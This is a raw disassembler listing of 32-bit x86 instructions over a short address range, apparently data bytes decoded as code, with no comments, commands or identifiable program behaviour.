  4494e2:	push   eax
  4494e3:	or     ah,BYTE PTR [eax+eax*1]
  4494e6:	dec    esp
  4494e7:	or     ah,BYTE PTR [eax+eax*1]
  4494ea:	dec    eax
  4494eb:	or     dh,ah
  4494ed:	call   eax
  4494ef:	push   cs
  4494f0:	hlt    
  4494f1:	dec    DWORD PTR [edi+0xa]
  4494f4:	in     al,0xff
  4494f6:	dec    ebx
  4494f7:	or     ah,ah
  4494f9:	inc    DWORD PTR [edi+0xa]
  4494fc:	hlt    
  4494fd:	inc    DWORD PTR [ebx+0xa]
  449500:	hlt    
  449501:	(bad)  
  449502:	aas    
  449503:	or     cl,BYTE PTR ds:0x73bfd19
  449509:	sbb    ebp,edi
  44950b:	aaa    
  44950c:	pop    ss
  44950d:	sbb    ebp,edi
  44950f:	xor    edx,DWORD PTR [edi]
  449511:	sbb    ebp,edi
  449513:	pop    ds
  449514:	pop    es
  449515:	sbb    ebp,edi
  449517:	sbb    eax,DWORD PTR [edi]
  449519:	sbb    ebp,edi
  44951b:	pop    ss
  44951c:	pop    ss
  44951d:	sbb    ebp,edi
  44951f:	adc    edx,DWORD PTR [edi]
  449521:	sbb    ebp,edi
  449523:	sysret 
  449525:	sbb    ebp,edi
  449527:	or     eax,DWORD PTR [edi]
  449529:	sbb    ebp,edi
  44952b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44952c:	push   ss
  44952d:	sbb    ebp,edi
  44952f:	add    edx,DWORD PTR [edi]
  449531:	sbb    ebp,edi
  449533:	inc    DWORD PTR [eax]
	...
  449551:	add    BYTE PTR [edi],al
  449553:	sbb    ebp,edi
  449555:	sti    
  449556:	add    al,0x19
  449558:	std    
  449559:	not    DWORD PTR [ecx+ebx*1]
  44955c:	std    
  44955d:	repz adc al,0x19
  449560:	std    
  449561:	out    dx,eax
  449562:	add    al,0x19
  449564:	std    
  449565:	jmp    0x44956b
  449567:	sbb    ebp,edi
  449569:	out    0x14,eax
  44956b:	sbb    ebp,edi
  44956d:	jecxz  0x449583
  44956f:	sbb    ebp,edi
  449571:	fild   WORD PTR [ecx+ebx*1]
  449574:	std    
  449575:	fild   DWORD PTR [ecx+ebx*1]
  449578:	std    
  449579:	xlat   BYTE PTR ds:[ebx]
  44957a:	adc    al,0x19
  44957c:	std    
  44957d:	rcl    DWORD PTR [ecx+ebx*1],cl
  449580:	std    
  449581:	iret   
  449582:	add    al,0x19
  449584:	std    
  449585:	retf   
  449586:	add    al,0x19
  449588:	std    
  449589:	pushw  ss
  44958b:	sbb    ebp,edi
  44958d:	ret    
  44958e:	adc    al,0x19
  449590:	std    
  449591:	mov    edi,0xbbfd1904
  449596:	add    al,0x19
  449598:	std    
  449599:	mov    bh,0x14
  44959b:	add    bh,ah
  44959d:	add    ebx,DWORD PTR [ecx-0x62fc1908]
  4495a3:	clc    
  4495a4:	out    0x3,al
  4495a6:	mov    eax,ds:0x7503e6f8
  4495ab:	clc    
  4495ac:	out    0x3,al
  4495ae:	imul   edi,eax,0xf6b903e6
  4495b4:	out    0x3,al
	...
  4495d2:	add    BYTE PTR [eax],al
  4495d4:	xchg   ecx,eax
  4495d5:	clc    
  4495d6:	out    0x3,al
  4495d8:	test   eax,edi
  4495da:	out    0x3,al
  4495dc:	jns    0x4495d6
  4495de:	out    0x3,al
  4495e0:	jge    0x4495da
  4495e2:	out    0x3,al
  4495e4:	cmp    eax,0xf89503e6
  4495ea:	out    0x3,al
  4495ec:	mov    eax,edi
  4495ee:	out    0x3,al
  4495f0:	(bad)  
  4495f1:	clc    
  4495f2:	out    0x3,al
  4495f4:	icebp  
  4495f5:	clc    
  4495f6:	out    0x3,al
  4495f8:	in     eax,0xf8
  4495fa:	out    0x3,al
  4495fc:	fprem  
  4495fe:	out    0x3,al
  449600:	(bad)  
  449602:	out    0x3,al
  449604:	loope  0x4495fe
  449606:	out    0x3,al
  449608:	mov    ch,0xf8
  44960a:	out    0x3,al
  44960c:	push   ebx
  44960d:	mul    dh
  44960f:	add    ebp,DWORD PTR [ebp-0x2efc1908]
  449615:	clc    
  449616:	out    0x3,al
  449618:	(bad)  
  44961b:	add    edi,DWORD PTR [ecx-0x42fc1908]
  449621:	clc    
  449622:	out    0x3,al
  449624:	sar    eax,0xe6
  449627:	add    edx,DWORD PTR [ebp-0x9]
  44962a:	out    0x3,al
  44962c:	dec    ecx
  44962d:	mul    esi
  44962f:	add    ecx,DWORD PTR [ebp-0x9]
  449632:	(bad)  
  449633:	call   0xe94b6246
	...
  449654:	add    BYTE PTR [eax],al
  449656:	push   cs
  449657:	enter  0xe906,0xe
  44965b:	aam    0x6
  44965d:	jmp    0xe949fc70
  449662:	push   cs
  449663:	jb     0x44966a
  449665:	jmp    0xe94a0478
  44966a:	push   cs
  44966b:	jp     0x449672
  44966d:	jmp    0xe94b6780
  449672:	push   cs
  449673:	add    BYTE PTR ds:0x57e0ee9,0xe9
  44967a:	push   cs
  44967b:	mov    al,BYTE PTR [ecx+ebp*8]
  44967e:	push   cs
  44967f:	loope  0x449687
  449681:	jmp    0xe94b7394
  449686:	push   cs
  449687:	mov    es,WORD PTR [ecx+ebp*8]
  44968a:	push   cs
  44968b:	in     eax,0x6
  44968d:	jmp    0xe9492ca0
  449692:	push   cs
  449693:	mov    ds:0x9e0ee904,al
  449698:	add    al,0xe9
  44969a:	push   cs
  44969b:	stos   BYTE PTR es:[edi],al
  44969c:	add    al,0xe9
  44969e:	push   cs
  44969f:	adc    BYTE PTR [eax],cl
  4496a1:	jmp    0xe94cb2b4
  4496a6:	push   cs
  4496a7:	sbb    BYTE PTR [eax],cl
  4496a9:	jmp    0xe94950bc
  4496ae:	push   cs
  4496af:	adc    DWORD PTR [eax],ecx
  4496b1:	jmp    0xe94ca3c4
  4496b6:	push   cs
  4496b7:	sbb    DWORD PTR [eax],ecx
  4496b9:	jmp    0x4496be
	...
  4496d6:	add    BYTE PTR [eax],al
  4496d8:	push   cs
  4496d9:	adc    eax,0x210ee908
  4496de:	or     cl,ch
  4496e0:	push   cs
  4496e1:	sbb    eax,0xce0ee908
  4496e6:	add    al,0x0
  4496e8:	hlt    
  4496e9:	cld    
  4496ea:	sub    DWORD PTR [ebx],ecx
  4496ec:	in     al,0xfc
  4496ee:	ror    BYTE PTR [eax],1
  4496f0:	in     al,0xfc
  4496f2:	int3   
  4496f3:	or     ah,dh
  4496f5:	cld    
  4496f6:	enter  0xf408,0xfc
  4496fa:	les    ecx,FWORD PTR [eax]
  4496fc:	in     al,0xfc
  4496fe:	adc    eax,0x11fce40b
  449703:	or     esi,DWORD PTR [esp+edi*8-0x34bf4f3]
  44970a:	or     DWORD PTR [ebx],ecx
  44970c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44970d:	cld    
  44970e:	mov    al,0x8
  449710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449711:	cld    
  449712:	lods   al,BYTE PTR ds:[esi]
  449713:	or     BYTE PTR [esp+edi*8-0x34bf758],dh
  44971a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44971b:	or     BYTE PTR [esp+edi*8-0x35bf760],ah
  449722:	pushf  
  449723:	or     BYTE PTR [esp+edi*8-0x13],dh
  449727:	or     dh,BYTE PTR [esp+edi*8-0x6c]
  44972b:	or     BYTE PTR [esp+edi*8-0x70],ah
  44972f:	or     BYTE PTR [esp+edi*8-0x74],ah
  449733:	or     BYTE PTR [esp+edi*8-0x78],dh
  449737:	or     BYTE PTR [esp+edi*8-0x7c],dh
  44973b:	or     BYTE PTR [eax],al
	...
  449759:	add    BYTE PTR [esp+edi*8-0x80],ah
  44975d:	or     BYTE PTR [esp+edi*8+0x7c],ah
  449761:	or     BYTE PTR [esp+edi*8],dh
  449764:	js     0x44976e
  449766:	xor    al,0xfc
  449768:	je     0x449772
  44976a:	and    al,0xfc
  44976c:	jo     0x449776
  44976e:	and    al,0xfc
  449770:	ins    BYTE PTR es:[edi],dx
  449771:	or     BYTE PTR [esp+edi*8],dh
  449774:	mov    ebp,0xb9fc340a
  449779:	or     ah,BYTE PTR [esp+edi*8]
  44977c:	mov    ch,0xa
  44977e:	or     eax,0x17b5fd17
  449783:	sbb    ebp,edi
  449785:	mov    cl,0x17
  449787:	sbb    ebp,edi
  449789:	lods   eax,DWORD PTR ds:[esi]
  44978a:	pop    es
  44978b:	sbb    ebp,edi
  44978d:	test   eax,0xa5fd1907
  449792:	pop    ss
  449793:	sbb    ebp,edi
  449795:	mov    eax,ds:0x9dfd1917
  44979a:	pop    es
  44979b:	sbb    ebp,edi
  44979d:	cdq    
  44979e:	pop    es
  44979f:	sbb    ebp,edi
  4497a1:	xchg   ebp,eax
  4497a2:	pop    ss
  4497a3:	sbb    ebp,edi
  4497a5:	xchg   ecx,eax
  4497a6:	pop    ss
  4497a7:	sbb    ebp,edi
  4497a9:	lea    eax,[edi]
  4497ab:	sbb    ebp,edi
  4497ad:	mov    DWORD PTR [edi],eax
  4497af:	sbb    ebp,edi
  4497b1:	test   DWORD PTR [edi],edx
  4497b3:	sbb    ebp,edi
  4497b5:	adc    DWORD PTR [edi],0x77dfd19
  4497bb:	sbb    ebp,edi
  4497bd:	jns    0x4497bf
	...
  4497db:	add    BYTE PTR [edi],al
  4497dd:	sbb    ebp,edi
  4497df:	jne    0x4497f8
  4497e1:	sbb    ebp,edi
  4497e3:	jno    0x4497fc
  4497e5:	sbb    ebp,edi
  4497e7:	ins    DWORD PTR es:[edi],dx
  4497e8:	pop    es
  4497e9:	sbb    ebp,edi
  4497eb:	imul   eax,DWORD PTR [edi],0x1765fd19
  4497f1:	sbb    ebp,edi
  4497f3:	popa   
  4497f4:	pop    ss
  4497f5:	sbb    ebp,edi
  4497f7:	pop    ebp
  4497f8:	pop    es
  4497f9:	sbb    ebp,edi
  4497fb:	pop    ecx
  4497fc:	pop    es
  4497fd:	sbb    ebp,edi
  4497ff:	push   ebp
  449800:	pop    ss
  449801:	sbb    ebp,edi
  449803:	push   ecx
  449804:	pop    ss
  449805:	sbb    ebp,edi
  449807:	dec    ebp
  449808:	pop    es
  449809:	sbb    ebp,edi
  44980b:	dec    ecx
  44980c:	pop    es
  44980d:	sbb    ebp,edi
  44980f:	inc    ebp
  449810:	pop    ss
  449811:	sbb    ebp,edi
  449813:	inc    ecx
  449814:	pop    ss
  449815:	add    bh,ah
  449817:	add    ebx,ebx
  449819:	stc    
  44981a:	out    0x3,al
  44981c:	xlat   BYTE PTR ds:[ebx]
  44981d:	stc    
  44981e:	out    0x3,al
  449820:	inc    ebx
  449821:	cli    
  449822:	out    0x3,al
  449824:	aas    
  449825:	cli    
  449826:	out    0x3,al
  449828:	sub    edi,edx
  44982a:	out    0x3,al
  44982c:	daa    
  44982d:	cli    
  44982e:	out    0x3,al
  449830:	xor    edi,edx
  449832:	out    0x3,al
  449834:	das    
  449835:	cli    
  449836:	out    0x3,al
  449838:	sti    
  449839:	stc    
  44983a:	out    0x3,al
  44983c:	idiv   ecx
  44983e:	out    0x3,al
	...
  44985c:	add    BYTE PTR [eax],al
  44985e:	and    edi,edx
  449860:	out    0x3,al
  449862:	pop    ds
  449863:	cli    
  449864:	out    0x3,al
  449866:	or     edi,edx
  449868:	out    0x3,al
  44986a:	pop    es
  44986b:	cli    
  44986c:	out    0x3,al
  44986e:	adc    edi,edx
  449870:	out    0x3,al
  449872:	psubd  mm4,mm6
  449875:	add    ebx,DWORD PTR [ebx-0x68fc1908]
  44987b:	clc    
  44987c:	out    0x3,al
  44987e:	cmp    eax,0xffffffe6
  449881:	add    edi,DWORD PTR [edi-0x8]
  449884:	out    0x3,al
  449886:	imul   edi,eax,0xffffffe6
  449889:	add    esp,DWORD PTR [edi-0x8]
  44988c:	out    0x3,al
  44988e:	jae    0x449888
  449890:	out    0x3,al
  449892:	outs   dx,DWORD PTR ds:[esi]
  449893:	clc    
  449894:	out    0x3,al
  449896:	cmp    edi,eax
  449898:	out    0x3,al
  44989a:	aaa    
  44989b:	clc    
  44989c:	out    0x3,al
  44989e:	arpl   ax,di
  4498a0:	out    0x3,al
  4498a2:	pop    edi
  4498a3:	clc    
  4498a4:	out    0x3,al
  4498a6:	dec    ebx
  4498a7:	clc    
  4498a8:	out    0x3,al
  4498aa:	inc    edi
  4498ab:	clc    
  4498ac:	(bad)  
  4498ad:	call   0xe94bd6c0
  4498b2:	push   cs
  4498b3:	inc    edx
  4498b4:	pop    es
  4498b5:	jmp    0xe94bdec8
  4498ba:	push   cs
  4498bb:	dec    edx
  4498bc:	pop    es
  4498bd:	jmp    0xe94be6d0
	...
  4498de:	add    BYTE PTR [eax],al
  4498e0:	push   cs
  4498e1:	push   edx
  4498e2:	pop    es
  4498e3:	jmp    0xe94beef6
  4498e8:	push   cs
  4498e9:	pop    edx
  4498ea:	pop    es
  4498eb:	jmp    0xe94bf6fe
  4498f0:	push   cs
  4498f1:	bound  eax,QWORD PTR [edi]
  4498f3:	jmp    0xe94bff06
  4498f8:	push   cs
  4498f9:	push   0x7
  4498fb:	jmp    0xe94c070e
  449900:	push   cs
  449901:	jb     0x44990a
  449903:	jmp    0xe94c0f16
  449908:	push   cs
  449909:	jp     0x449912
  44990b:	jmp    0xe94c171e
  449910:	push   cs
  449911:	add    BYTE PTR [edi],0xe9
  449914:	push   cs
  449915:	xchg   BYTE PTR [esi],al
  449917:	jmp    0xe94b232a
  44991c:	push   cs
  44991d:	mov    es,WORD PTR [esi]
  44991f:	jmp    0xe94b2b32
  449924:	push   cs
  449925:	xchg   esi,eax
  449926:	push   es
  449927:	jmp    0xe94b333a
  44992c:	push   cs
  44992d:	sahf   
  44992e:	push   es
  44992f:	jmp    0xe94b3b42
  449934:	push   cs
  449935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449936:	push   es
  449937:	jmp    0xe94b434a
  44993c:	push   cs
  44993d:	scas   al,BYTE PTR es:[edi]
  44993e:	push   es
  44993f:	jmp    0x4b4b52
	...
  449960:	add    BYTE PTR [eax],al
  449962:	and    al,0x1
  449964:	dec    edx
  449965:	or     DWORD PTR [ecx+eax*1],esp
  449968:	inc    esi
  449969:	or     DWORD PTR [ecx+eax*1],esi
  44996c:	inc    edx
  44996d:	or     DWORD PTR [ecx+eax*1],esi
  449970:	or     DWORD PTR ds:[ecx+eax*1],esp
  449974:	cmp    cl,BYTE PTR [ecx]
  449976:	and    al,0x1
  449978:	ss or  esp,esi
  44997b:	add    BYTE PTR [edx],dh
  44997d:	or     esp,esi
  44997f:	add    BYTE PTR [esi],ch
  449981:	or     esp,esp
  449983:	add    BYTE PTR [edx],ch
  449985:	or     esp,esp
  449987:	add    BYTE PTR [esi],ah
  449989:	or     esp,esi
  44998b:	add    BYTE PTR [edx],ah
  44998d:	or     esp,esi
  44998f:	add    BYTE PTR [esi],bl
  449991:	or     esp,esp
  449993:	add    BYTE PTR [edx],bl
  449995:	or     esp,esp
  449997:	add    BYTE PTR [esi],dl
  449999:	or     DWORD PTR [eax+eax*1+0xb40912],esi
  4499a0:	push   cs
  4499a1:	or     DWORD PTR [eax+eax*1+0xa4090a],esp
  4499a8:	push   es
  4499a9:	or     DWORD PTR [eax+eax*1+0xb40902],esi
  4499b0:	dec    BYTE PTR [eax]
  4499b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4499b3:	add    dl,bh
  4499b5:	or     BYTE PTR [eax+eax*1+0x7408f6],ah
  4499bc:	repnz or BYTE PTR [eax+eax*1-0x12],dh
  4499c1:	or     BYTE PTR [eax+eax*1-0x16],ah
  4499c5:	or     BYTE PTR [eax],al
	...
  4499e3:	add    BYTE PTR [eax+eax*1-0x1a],ah
  4499e7:	or     BYTE PTR [eax+eax*1-0x1e],dh
  4499eb:	or     BYTE PTR [eax+eax*1-0x22],dh
  4499ef:	or     BYTE PTR [eax+eax*1-0x26],ah
  4499f3:	or     BYTE PTR [eax+eax*1-0x2a],ah
  4499f7:	or     BYTE PTR ds:0x15d5fd17,cl
  4499fd:	pop    ss
  4499fe:	std    
  4499ff:	rol    DWORD PTR ds:0x5cdfd17,1
  449a05:	pop    ss
  449a06:	std    
  449a07:	leave  
  449a08:	adc    eax,0x15c5fd17
  449a0d:	pop    ss
  449a0e:	std    
  449a0f:	rol    DWORD PTR ds:0x5bdfd17,0x17
  449a16:	std    
  449a17:	mov    ecx,0xb5fd1915
  449a1c:	adc    eax,0x5b1fd19
  449a21:	sbb    ebp,edi
  449a23:	lods   eax,DWORD PTR ds:[esi]
  449a24:	add    eax,0x15a9fd19
  449a29:	sbb    ebp,edi
  449a2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449a2c:	adc    eax,0x5a1fd19
  449a31:	sbb    ebp,edi
  449a33:	popf   
  449a34:	add    eax,0x1599fd19
  449a39:	sbb    ebp,edi
  449a3b:	xchg   ebp,eax
  449a3c:	adc    eax,0x591fd19
  449a41:	sbb    ebp,edi
  449a43:	lea    eax,ds:0x89fd19
	...
  449a65:	add    BYTE PTR ds:0x1585fd19,dl
  449a6b:	sbb    ebp,edi
  449a6d:	add    DWORD PTR ds:0x57dfd19,0x1579fd19
  449a77:	sbb    ebp,edi
  449a79:	jne    0x449a90
  449a7b:	sbb    ebp,edi
  449a7d:	jno    0x449a84
  449a7f:	sbb    ebp,edi
  449a81:	ins    DWORD PTR es:[edi],dx
  449a82:	add    eax,0x1569fd19
  449a87:	sbb    ebp,edi
  449a89:	gs adc eax,0x561fd19
  449a8f:	add    bh,ah
  449a91:	add    esi,DWORD PTR [ebx-0x18fc1909]
  449a97:	mul    esi
  449a99:	add    ebx,ebx
  449a9b:	mul    esi
  449a9d:	add    ebx,edi
  449a9f:	mul    esi
  449aa1:	add    eax,ebx
  449aa3:	mul    esi
  449aa5:	add    edx,edi
  449aa7:	mul    esi
  449aa9:	add    ecx,ebx
  449aab:	mul    esi
  449aad:	add    ecx,edi
  449aaf:	mul    esi
  449ab1:	add    edx,ebx
  449ab3:	mul    esi
  449ab5:	add    eax,DWORD PTR [edi-0x8]
  449ab8:	out    0x3,al
  449aba:	cmp    edi,eax
  449abc:	out    0x3,al
  449abe:	aas    
  449abf:	clc    
  449ac0:	out    0x3,al
  449ac2:	and    edi,eax
  449ac4:	out    0x3,al
  449ac6:	aaa    
  449ac7:	clc    
  449ac8:	out    0x3,al
	...
  449ae6:	add    BYTE PTR [eax],al
  449ae8:	sub    edi,eax
  449aea:	out    0x3,al
  449aec:	das    
  449aed:	clc    
  449aee:	out    0x3,al
  449af0:	repz mul esi
  449af3:	add    esp,DWORD PTR [edi]
  449af5:	clc    
  449af6:	out    0x3,al
  449af8:	sbb    edi,eax
  449afa:	out    0x3,al
  449afc:	pop    ds
  449afd:	clc    
  449afe:	out    0x3,al
  449b00:	add    edi,eax
  449b02:	out    0x3,al
  449b04:	hlt    
  449b05:	cli    
  449b06:	out    0x3,al
  449b08:	call   0xf488207
  449b0d:	clc    
  449b0e:	out    0x3,al
  449b10:	xchg   ebx,eax
  449b11:	cli    
  449b12:	out    0x3,al
  449b14:	xchg   edx,edi
  449b16:	out    0x3,al
  449b18:	jnp    0x449b14
  449b1a:	out    0x3,al
  449b1c:	jg     0x449b18
  449b1e:	out    0x3,al
  449b20:	arpl   dx,di
  449b22:	out    0x3,al
  449b24:	ja     0x449b20
  449b26:	(bad)  
  449b27:	call   0xe945b53a
  449b2c:	push   cs
  449b2d:	push   ds
  449b2e:	add    ecx,ebp
  449b30:	push   cs
  449b31:	and    al,BYTE PTR [ecx]
  449b33:	jmp    0xe945c146
  449b38:	push   cs
  449b39:	sub    al,BYTE PTR [ecx]
  449b3b:	jmp    0xe945c94e
  449b40:	push   cs
  449b41:	xor    al,BYTE PTR [ecx]
  449b43:	jmp    0xe945d156
  449b48:	push   cs
  449b49:	cmp    al,BYTE PTR [ecx]
  449b4b:	jmp    0x449b50
	...
  449b68:	add    BYTE PTR [eax],al
  449b6a:	push   cs
  449b6b:	ds add ecx,ebp
  449b6e:	push   cs
  449b6f:	inc    edx
  449b70:	add    ecx,ebp
  449b72:	push   cs
  449b73:	inc    esi
  449b74:	add    ecx,ebp
  449b76:	push   cs
  449b77:	dec    edx
  449b78:	add    ecx,ebp
  449b7a:	push   cs
  449b7b:	dec    esi
  449b7c:	add    ecx,ebp
  449b7e:	push   cs
  449b7f:	push   edx
  449b80:	add    ecx,ebp
  449b82:	push   cs
  449b83:	fwait
  449b84:	add    ch,cl
  449b86:	push   cs
  449b87:	lahf   
  449b88:	add    ch,cl
  449b8a:	push   cs
  449b8b:	mov    ds:0xa70ee902,eax
  449b90:	add    ch,cl
  449b92:	push   cs
  449b93:	stos   DWORD PTR es:[edi],eax
  449b94:	add    ch,cl
  449b96:	push   cs
  449b97:	scas   eax,DWORD PTR es:[edi]
  449b98:	add    ch,cl
  449b9a:	push   cs
  449b9b:	mov    bl,0x2
  449b9d:	jmp    0xe94777b0
  449ba2:	push   cs
  449ba3:	jbe    0x449ba6
  449ba5:	jmp    0xe94615b8
  449baa:	push   cs
  449bab:	jle    0x449bae
  449bad:	jmp    0xe9451dc0
  449bb2:	push   cs
  449bb3:	retf   
  449bb4:	add    ch,cl
  449bb6:	push   cs
  449bb7:	iret   
  449bb8:	add    ch,cl
  449bba:	push   cs
  449bbb:	rol    DWORD PTR [edx],cl
  449bbd:	add    BYTE PTR [ebp+edi*8+0x26],ah
  449bc1:	add    eax,0x765fd74
  449bc6:	je     0x449bc5
  449bc8:	popa   
  449bc9:	pop    es
  449bca:	fs std 
  449bcc:	pop    ebp
  449bcd:	pop    es
	...
  449bea:	add    BYTE PTR [eax],al
  449bec:	fs std 
  449bee:	pop    ecx
  449bef:	pop    es
  449bf0:	xor    al,0xfd
  449bf2:	push   ebp
  449bf3:	pop    es
  449bf4:	xor    al,0xfd
  449bf6:	push   ecx
  449bf7:	pop    es
  449bf8:	and    al,0xfd
  449bfa:	dec    ebp
  449bfb:	pop    es
  449bfc:	and    al,0xfd
  449bfe:	dec    ecx
  449bff:	pop    es
  449c00:	xor    al,0xfd
  449c02:	add    al,BYTE PTR ds:0x4fefd34
  449c08:	and    al,0xfd
  449c0a:	cli    
  449c0b:	add    al,0x24
  449c0d:	std    
  449c0e:	cmp    DWORD PTR [edi],eax
  449c10:	hlt    
  449c11:	cld    
  449c12:	xor    eax,0x31fcf407
  449c17:	pop    es
  449c18:	in     al,0xfc
  449c1a:	sub    eax,0x29fce407
  449c1f:	pop    es
  449c20:	hlt    
  449c21:	cld    
  449c22:	and    eax,0x21fcf407
  449c27:	pop    es
  449c28:	in     al,0xfc
  449c2a:	sbb    eax,0x19fce407
  449c2f:	pop    es
  449c30:	mov    ah,0xfc
  449c32:	adc    eax,0x11fcb407
  449c37:	pop    es
  449c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449c39:	cld    
  449c3a:	or     eax,0x9fca407
  449c3f:	pop    es
  449c40:	mov    ah,0xfc
  449c42:	add    eax,0x1fcb407
  449c47:	pop    es
  449c48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449c49:	cld    
  449c4a:	std    
  449c4b:	push   es
  449c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449c4d:	cld    
  449c4e:	stc    
  449c4f:	push   es
	...
  449c6c:	add    BYTE PTR [eax],al
  449c6e:	je     0x449c6c
  449c70:	cmc    
  449c71:	push   es
  449c72:	or     eax,0x13f5fd17
  449c77:	pop    ss
  449c78:	std    
  449c79:	icebp  
  449c7a:	or     edx,DWORD PTR [edi]
  449c7c:	std    
  449c7d:	in     eax,dx
  449c7e:	adc    edx,DWORD PTR [edi]
  449c80:	std    
  449c81:	jmp    0xe641b391
  449c86:	adc    edx,DWORD PTR [edi]
  449c88:	std    
  449c89:	loope  0x449c96
  449c8b:	pop    ss
  449c8c:	std    
  449c8d:	fst    QWORD PTR [ebx]
  449c8f:	pop    ss
  449c90:	std    
  449c91:	(bad)  [ebx]
  449c93:	pop    ss
  449c94:	std    
  449c95:	aad    0x13
  449c97:	pop    ss
  449c98:	std    
  449c99:	ror    DWORD PTR [ebx],1
  449c9b:	pop    ss
  449c9c:	std    
  449c9d:	int    0x13
  449c9f:	pop    ss
  449ca0:	std    
  449ca1:	test   BYTE PTR [ecx],cl
  449ca3:	pop    ss
  449ca4:	std    
  449ca5:	adc    BYTE PTR [ecx],0x17
  449ca8:	std    
  449ca9:	jl     0x449cb4
  449cab:	pop    ss
  449cac:	std    
  449cad:	mov    ebp,0xb9fce913
  449cb2:	or     ebp,ecx
  449cb4:	cld    
  449cb5:	mov    ch,0x13
  449cb7:	jmp    0xe9504eb8
  449cbc:	cld    
  449cbd:	lods   eax,DWORD PTR ds:[esi]
  449cbe:	adc    ebp,ecx
  449cc0:	cld    
  449cc1:	test   eax,0xa5fce90b
  449cc6:	adc    ebp,ecx
  449cc8:	cld    
  449cc9:	mov    eax,ds:0x9dfce90b
  449cce:	adc    ebp,ecx
  449cd0:	cld    
  449cd1:	cdq    
	...
  449cee:	add    BYTE PTR [eax],al
  449cf0:	or     ebp,ecx
  449cf2:	cld    
  449cf3:	xchg   ebp,eax
  449cf4:	adc    ebp,ecx
  449cf6:	cld    
  449cf7:	xchg   ecx,eax
  449cf8:	or     ebp,ecx
  449cfa:	cld    
  449cfb:	lea    edx,[ebx]
  449cfd:	jmp    0xe95026fe
  449d02:	cld    
  449d03:	test   DWORD PTR [ebx],edx
  449d05:	jmp    0x501f06
  449d0a:	out    0x3,eax
  449d0c:	or     eax,DWORD PTR [esi]
  449d0e:	out    0x3,eax
  449d10:	pop    es
  449d11:	push   es
  449d12:	out    0x3,eax
  449d14:	add    eax,DWORD PTR [esi]
  449d16:	out    0x3,eax
  449d18:	inc    DWORD PTR ds:0x5fb03e7
  449d1e:	out    0x3,eax
  449d20:	test   DWORD PTR ds:0x5f303e7,0x5ef03e7
  449d2a:	out    0x3,eax
  449d2c:	jmp    0x449d33
  449d2e:	out    0x3,eax
  449d30:	out    0x5,eax
  449d32:	out    0x3,eax
  449d34:	jecxz  0x449d3b
  449d36:	out    0x3,eax
  449d38:	fild   WORD PTR ds:0x5db03e7
  449d3e:	out    0x3,eax
  449d40:	or     BYTE PTR [edi+eiz*8],al
  449d43:	add    ecx,DWORD PTR [esp+eax*1]
  449d46:	out    0x3,eax
  449d48:	adc    BYTE PTR [ebx],al
  449d4a:	out    0x3,eax
  449d4c:	add    al,0x3
  449d4e:	out    0x3,eax
  449d50:	inc    edi
  449d51:	push   es
  449d52:	out    0x3,eax
	...
  449d70:	add    BYTE PTR [eax],al
  449d72:	inc    ebx
  449d73:	push   es
  449d74:	out    0x3,eax
  449d76:	aas    
  449d77:	push   es
  449d78:	out    0x3,eax
  449d7a:	cmp    eax,DWORD PTR [esi]
  449d7c:	out    0x3,eax
  449d7e:	aaa    
  449d7f:	push   es
  449d80:	out    0x3,eax
  449d82:	xor    eax,DWORD PTR [esi]
  449d84:	out    0x3,eax
  449d86:	das    
  449d87:	push   es
  449d88:	out    0x3,eax
  449d8a:	sub    eax,DWORD PTR [esi]
  449d8c:	out    0x3,eax
  449d8e:	daa    
  449d8f:	push   es
  449d90:	out    0x3,eax
  449d92:	and    eax,DWORD PTR [esi]
  449d94:	out    0x3,eax
  449d96:	pop    ds
  449d97:	push   es
  449d98:	out    0x3,eax
  449d9a:	sbb    eax,DWORD PTR [esi]
  449d9c:	out    0x3,eax
  449d9e:	pop    ss
  449d9f:	push   es
  449da0:	add    cl,ch
  449da2:	push   cs
  449da3:	push   es
  449da4:	add    ch,cl
  449da6:	push   cs
  449da7:	add    al,BYTE PTR [edx]
  449da9:	jmp    0xe9479bbc
  449dae:	push   cs
  449daf:	cli    
  449db0:	add    ch,cl
  449db2:	push   cs
  449db3:	test   BYTE PTR [edx],0xe9
  449db6:	push   cs
  449db7:	repnz add ch,cl
  449dba:	push   cs
  449dbb:	out    dx,al
  449dbc:	add    ch,cl
  449dbe:	push   cs
  449dbf:	jmp    0xe902:0xe60ee902
  449dc6:	push   cs
  449dc7:	loop   0x449dcb
  449dc9:	jmp    0xe9477bdc
  449dce:	push   cs
  449dcf:	fiadd  DWORD PTR [edx]
  449dd1:	jmp    0xe94773e4
	...
  449df2:	add    BYTE PTR [eax],al
  449df4:	push   cs
  449df5:	rol    BYTE PTR [edx],cl
  449df7:	jmp    0xe9476c0a
  449dfc:	push   cs
  449dfd:	retf   0xe902
  449e00:	push   cs
  449e01:	mov    BYTE PTR [edx],0xe9
  449e04:	push   cs
  449e05:	ret    0xe902
  449e08:	push   cs
  449e09:	mov    esi,0xba0ee902
  449e0e:	add    ch,cl
  449e10:	push   cs
  449e11:	mov    dh,0x2
  449e13:	jmp    0xe9475026
  449e18:	push   cs
  449e19:	scas   al,BYTE PTR es:[edi]
  449e1a:	add    ch,cl
  449e1c:	push   cs
  449e1d:	stos   BYTE PTR es:[edi],al
  449e1e:	add    ch,cl
  449e20:	push   cs
  449e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449e22:	add    ch,cl
  449e24:	push   cs
  449e25:	mov    ds:0x9e0ee902,al
  449e2a:	add    ch,cl
  449e2c:	push   cs
  449e2d:	call   0xe902:0x960ee902
  449e34:	push   cs
  449e35:	xchg   edx,eax
  449e36:	add    al,BYTE PTR [eax]
  449e38:	mov    ah,0x1
  449e3a:	mov    al,BYTE PTR ds:0x58601b4
  449e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449e41:	add    DWORD PTR [edx+0x7e01a405],eax
  449e47:	add    eax,0x57a0174
  449e4c:	je     0x449e4f
  449e4e:	jbe    0x449e55
  449e50:	add    DWORD PTR fs:[edx+0x5],esi
  449e54:	add    DWORD PTR fs:[esi+0x5],ebp
	...
